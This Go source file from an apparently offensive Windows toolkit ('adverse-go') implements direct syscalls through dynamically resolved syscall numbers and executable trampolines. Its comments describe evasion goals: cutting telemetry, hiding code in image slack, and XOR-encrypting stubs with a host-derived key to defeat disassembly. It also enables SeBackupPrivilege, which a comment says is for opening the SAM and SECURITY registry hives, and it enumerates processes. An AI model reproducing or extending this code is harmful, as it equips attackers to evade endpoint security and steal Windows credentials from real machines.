//go:build windows

package syscalls

import (
	"fmt"
	"log/slog"
	"sync"
	"unsafe"

	"github.com/ashwnn/adverse-go/internal/behavioural"
	"github.com/ashwnn/adverse-go/internal/stealth"
	"golang.org/x/sys/windows"
)

// logger is a package-level logger for best-effort diagnostics (e.g. NtClose failures).
var logger = slog.Default()

var (
	cachedResolver     *stealth.SyscallResolver
	cachedResolverOnce sync.Once
)

func getCachedResolver() *stealth.SyscallResolver {
	cachedResolverOnce.Do(func() {
		cachedResolver = stealth.NewResolver()
	})
	return cachedResolver
}

// resolveSSN resolves a syscall number dynamically via the stealth resolver.
// It uses a singleton resolver so the per-name cache persists across calls
// and ntdll is not re-parsed on every syscall.
func resolveSSN(name string, fallback uint16) uint16 {
	resolver := getCachedResolver()
	ssn, err := resolver.Resolve(name)
	if err != nil {
		logger.Warn("dynamic resolution failed; using reference constant",
			"name", name, "err", err, "fallback", fallback)
		return fallback
	}
	return ssn
}

// stubCache caches generated trampolines per (ssn, argc) to avoid per-call
// VirtualAlloc(RX) churn and reduce telemetry noise.
var (
	stubCache   = make(map[uint32][]byte)
	stubCacheMu sync.RWMutex
)

func cachedTrampoline(ssn uint16, argc int) []byte {
	key := uint32(ssn)<<16 | uint32(argc)
	stubCacheMu.RLock()
	if code, ok := stubCache[key]; ok {
		stubCacheMu.RUnlock()
		return code
	}
	stubCacheMu.RUnlock()
	code := generateTrampoline(ssn, argc)
	stubCacheMu.Lock()
	stubCache[key] = code
	stubCacheMu.Unlock()
	return code
}

// allocExecMem allocates RW memory via VirtualAlloc, then caller must
// VirtualProtect to RX before execution (hardened: NOT RWX). The address is
// returned as an unsafe.Pointer so callers use unsafe.Add for offsets.
func allocExecMem(size uintptr) (unsafe.Pointer, error) {
	mem, err := windows.VirtualAlloc(0, size,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("VirtualAlloc(RW %d bytes): %w", size, err)
	}
	// VirtualAlloc returns a raw OS address, not Go-managed memory.
	return unsafe.Add(nil, mem), nil
}

func freeExecMem(addr unsafe.Pointer) {
	if addr != nil {
		windows.VirtualFree(uintptr(addr), 0, windows.MEM_RELEASE)
	}
}

// executeSyscall performs the actual syscall on Windows via the persistent
// trampoline pool (see trampoline_pool_windows.go): a single RX code region —
// preferably inside a loaded image's slack — plus a separate RW args region.
// The pool eliminates per-call VirtualAlloc/VirtualProtect churn and the
// repeating protection-flip pattern.
//
// If the pool is unavailable (construction failed), this falls back to the
// legacy per-call path: allocate RW, write stub (VEH-decrypted from the
// environment key), VirtualProtect to RX, execute, free. That path retains
// the env-keyed VEH decryption as a degradation mode.
func (s *SyscallInvoker) executeSyscall(stub *syscallStub, args []uintptr) (uintptr, error) {
	if p := getTrampolinePool(); p != nil && p.ready {
		return p.invoke(stub, args)
	}

	name := SyscallNames[stub.number]
	if name == "" {
		name = fmt.Sprintf("Unknown(0x%04x)", stub.number)
	}

	ssn := resolveSSN(name, stub.number)
	code := cachedTrampoline(ssn, stub.argCount)
	// Environment-keyed VEH trampoline: encrypt with host-specific key and
	// decrypt via ArmEncryptedTrampoline so the syscall stub is not visible
	// to linear-sweep disassembly. This wires the behavioural env-key into the
	// real extraction path: the env-keyed VEH path is used when the pool is unavailable.
	envKey := behavioural.EnvironmentalKey()
	enc := behavioural.RotatingXOR(code, envKey[0])
	plain, done := behavioural.ArmEncryptedTrampoline(enc)
	defer done()
	code = plain

	codeLen := uintptr(len(code))
	mem, err := allocExecMem(codeLen)
	if err != nil {
		return 0, fmt.Errorf("executeSyscall(%s): %w", name, err)
	}
	defer freeExecMem(mem)

	codeSlice := unsafe.Slice((*byte)(mem), codeLen)
	copy(codeSlice, code)

	argc := stub.argCount
	if argc > len(args) {
		argc = len(args)
	}
	argsBlockAddr := unsafe.Add(mem, uintptr(len(code)-argc*8))
	argsSlice := unsafe.Slice((*uintptr)(argsBlockAddr), argc)
	for i := 0; i < argc; i++ {
		argsSlice[i] = args[i]
	}

	// VirtualProtect to RX (RW → RX, NOT RWX)
	var oldProtect uint32
	err = windows.VirtualProtect(uintptr(mem), codeLen, windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return 0, fmt.Errorf("VirtualProtect(RX): %w", err)
	}

	var fn func() uintptr
	*(*uintptr)(unsafe.Pointer(&fn)) = uintptr(mem)
	result := fn()

	if result&0x80000000 != 0 {
		return result, fmt.Errorf("syscall 0x%04X (%s) failed: NTSTATUS 0x%08X", stub.number, name, result)
	}
	return result, nil
}

// ProcessEntry represents a process from system enumeration.
type ProcessEntry struct {
	PID  uint32
	Name string
}

// SeBackupPrivilege LUID — SE_BACKUP_NAME has LUID {17, 0} on all Windows versions.
const seBackupPrivilegeLUID_Low = 17

// logNtClose is a best-effort deferred helper that logs NtClose failures
// instead of silently discarding them.
func logNtClose(invoker *SyscallInvoker, handle uintptr, context string) {
	status, err := invoker.Invoke(SysNtClose, handle)
	if err != nil {
		logger.Warn("NtClose failed", "context", context, "handle", handle, "err", err)
	} else if !NT_SUCCESS(status) {
		logger.Warn("NtClose returned error status", "context", context, "handle", handle, "status", fmt.Sprintf("0x%08X", status))
	}
}

// EnableSeBackupPrivilege enables SeBackupPrivilege for the current process
// via direct syscalls: NtOpenProcessToken → NtAdjustPrivilegesToken.
// This privilege is required to open SAM/SECURITY hives with NtOpenKey.
//
// All NT API calls go through the dynamic-SSN trampoline path.
// The TOKEN_PRIVILEGES struct is zeroed after the call.
func EnableSeBackupPrivilege(invoker *SyscallInvoker) error {
	// Step 1: Open current process token
	// NtCurrentProcess pseudo-handle = 0xFFFFFFFFFFFFFFFF (-1 on x64)
	var tokenHandle uintptr
	status, err := invoker.Invoke(SysNtOpenProcessToken,
		0xFFFFFFFFFFFFFFFF,               // ProcessHandle = NtCurrentProcess
		uintptr(TOKEN_ADJUST_PRIVILEGES), // DesiredAccess
		uintptr(unsafe.Pointer(&tokenHandle)),
	)
	if err != nil {
		return fmt.Errorf("NtOpenProcessToken: %w", err)
	}
	if !NT_SUCCESS(status) {
		return fmt.Errorf("NtOpenProcessToken failed: NTSTATUS 0x%08X (%s)", status, NTStatusString(status))
	}
	defer logNtClose(invoker, tokenHandle, "EnableSeBackupPrivilege.tokenHandle")

	// Step 2: Build TOKEN_PRIVILEGES for SeBackupPrivilege
	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Luid: LUID{
			LowPart:  seBackupPrivilegeLUID_Low,
			HighPart: 0,
		},
		Attributes: SE_PRIVILEGE_ENABLED,
	}

	// Step 3: NtAdjustPrivilegesToken
	status, err = invoker.Invoke(SysNtAdjustPrivilegesToken,
		tokenHandle,                  // TokenHandle
		0,                            // DisableAllPrivileges = FALSE
		uintptr(unsafe.Pointer(&tp)), // NewState
		0,                            // BufferLength (0 = don't return previous state)
		0,                            // PreviousState = NULL
		0,                            // ReturnLength = NULL
	)
	if err != nil {
		return fmt.Errorf("NtAdjustPrivilegesToken: %w", err)
	}
	if !NT_SUCCESS(status) {
		return fmt.Errorf("NtAdjustPrivilegesToken failed: NTSTATUS 0x%08X (%s)", status, NTStatusString(status))
	}

	// Zeroize privilege struct
	*(*TOKEN_PRIVILEGES)(unsafe.Pointer(&tp)) = TOKEN_PRIVILEGES{}

	return nil
}

// EnumerateProcesses calls NtQuerySystemInformation.
func (s *SyscallInvoker) EnumerateProcesses() ([]ProcessEntry, error) {
	ssn := resolveSSN("NtQuerySystemInformation", SysNtQuerySystemInformation)

	bufSize := uintptr(4096)
	buf, err := windows.VirtualAlloc(0, bufSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("VirtualAlloc(buf): %w", err)
	}
	defer windows.VirtualFree(buf, 0, windows.MEM_RELEASE)

	code := generateTrampoline(ssn, 4)
	execMem, err := allocExecMem(uintptr(len(code)))
	if err != nil {
		return nil, fmt.Errorf("allocExecMem(trampoline): %w", err)
	}
	defer freeExecMem(execMem)

	copy(unsafe.Slice((*byte)(execMem), uintptr(len(code))), code)

	var returnLength uint32
	argsBase := unsafe.Add(execMem, uintptr(len(code)))
	argsSlice := unsafe.Slice((*uintptr)(argsBase), 4)
	argsSlice[0] = 5 // SystemProcessInformation
	argsSlice[1] = buf
	argsSlice[2] = bufSize
	argsSlice[3] = uintptr(unsafe.Pointer(&returnLength))

	var oldProtect uint32
	if err := windows.VirtualProtect(uintptr(execMem), uintptr(len(code)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
		return nil, fmt.Errorf("VirtualProtect(RX): %w", err)
	}

	var fn func() uintptr
	*(*uintptr)(unsafe.Pointer(&fn)) = uintptr(execMem)

	result := fn()
	for result == STATUS_INFO_LENGTH_MISMATCH {
		windows.VirtualFree(buf, 0, windows.MEM_RELEASE)
		bufSize = uintptr(returnLength) + 4096
		buf, err = windows.VirtualAlloc(0, bufSize,
			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if err != nil {
			return nil, fmt.Errorf("VirtualAlloc(buf retry): %w", err)
		}
		argsSlice[1] = buf
		argsSlice[2] = bufSize
		result = fn()
	}

	if result != 0 {
		return nil, fmt.Errorf("NtQuerySystemInformation failed: NTSTATUS 0x%08X", result)
	}

	bufPtr := unsafe.Add(nil, buf)
	var processes []ProcessEntry
	offset := uintptr(0)
	for {
		if offset+0x50 > bufSize {
			break
		}
		entryBase := unsafe.Add(bufPtr, offset)
		nextOffset := *(*uint32)(entryBase)
		// Validate entry is within buffer before reading fields
		if offset+uintptr(nextOffset) > bufSize && nextOffset != 0 {
			break
		}
		pid := *(*uintptr)(unsafe.Add(entryBase, 0x50))
		nameLen := *(*uint16)(unsafe.Add(entryBase, 0x38))
		nameBuf := *(*uintptr)(unsafe.Add(entryBase, 0x40))
		var name string
		if nameBuf != 0 && nameLen > 0 && nameLen <= 520 {
			// Validate name buffer lies within allocated region
			bufEnd := buf + bufSize
			nameEnd := nameBuf + uintptr(nameLen)
			if nameBuf >= buf && nameEnd <= bufEnd && nameBuf+uintptr(nameLen) >= nameBuf {
				// nameBuf points inside the same allocation (validated
				// above), so reach it via the carried base pointer.
				nameUTF16 := unsafe.Slice((*uint16)(unsafe.Add(bufPtr, nameBuf-buf)), nameLen/2)
				name = windows.UTF16ToString(nameUTF16)
			}
		}
		processes = append(processes, ProcessEntry{PID: uint32(pid), Name: name})
		if nextOffset == 0 {
			break
		}
		offset += uintptr(nextOffset)
		if offset >= bufSize {
			break
		}
	}
	return processes, nil
}
